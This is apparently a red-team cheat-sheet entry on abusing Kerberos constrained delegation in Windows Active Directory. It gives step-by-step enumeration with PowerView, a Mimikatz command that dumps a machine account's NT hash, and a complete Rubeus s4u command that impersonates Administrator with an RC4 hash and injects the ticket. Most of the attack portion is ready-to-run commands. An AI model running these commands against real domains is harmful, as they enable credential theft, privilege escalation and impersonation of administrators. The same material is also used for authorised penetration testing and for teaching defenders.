# 09.04 Constrained Delegation Windows

> Run `Rubeus s4u` (S4U2Self + S4U2Proxy with `/altservice`) from a `TRUSTED_TO_AUTH_FOR_DELEGATION` account to impersonate anyone to its allowed SPN.

## Overview

Accounts with TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition enabled) can impersonate any user to their allowed SPNs. PowerView Get-DomainComputer -TrustedToAuth enumerates them. The attack uses Rubeus s4u combining S4U2Self (get a forwardable TGS for any user) then S4U2Proxy (relay to allowed SPN), with /altservice to substitute a different service on the same host. The compromised account's NT hash is obtained first via Mimikatz.

## Steps

- Enumerate constrained delegation with PowerView: Get-DomainComputer -TrustedToAuth (computers) or Get-DomainUser -TrustedToAuth (users).
- Dump the machine account's NT hash from the compromised host with mimikatz sekurlsa::msv.
- Use Rubeus s4u with /impersonateuser /msdsspn /altservice /user /rc4 /ptt to request and inject the impersonation ticket.
- Verify the ticket in session with klist; note the alternate service substitution in the output.
- Access the target with Enter-PSSession or similar.

## Commands

### PowerView enumerate constrained delegation computers

```powershell
Import-Module .\PowerView.ps1
```

### Mimikatz dump machine account hash

```powershell
.\mimikatz.exe privilege::debug sekurlsa::msv exit
```

### Rubeus S4U constrained delegation

```powershell
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:www/WS01.<DOMAIN>.local /altservice:HTTP /user:DMZ01$ /rc4:ff955e93a130f5bb1a6565f32b7dc127 /ptt
```

### Verify ticket and access target

```powershell
klist
```
